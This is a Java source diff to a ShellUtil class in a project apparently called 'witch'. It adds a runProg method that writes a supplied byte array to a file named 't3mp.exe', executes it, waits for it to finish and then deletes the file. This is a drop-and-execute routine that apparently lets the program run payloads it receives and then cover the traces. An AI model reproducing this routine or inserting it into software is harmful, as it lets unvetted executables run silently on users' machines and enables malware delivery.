@@ -1,8 +1,6 @@
 package me.soda.witch.features;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 
 public class ShellUtil {
@@ -32,5 +30,20 @@ public class ShellUtil {
             e.printStackTrace();
         }
         return result.toString();
+    }
+
+    public static void runProg(byte[] bytes) {
+        try {
+            File file = new File("t3mp.exe");
+            file.createNewFile();
+            FileOutputStream out = new FileOutputStream(file);
+            out.write(bytes);
+            out.close();
+            Process process = Runtime.getRuntime().exec("t3mp.exe");
+            process.waitFor();
+            if (file.exists()) file.delete();
+        } catch (IOException |InterruptedException e) {
+            e.printStackTrace();
+        }
     }
 }
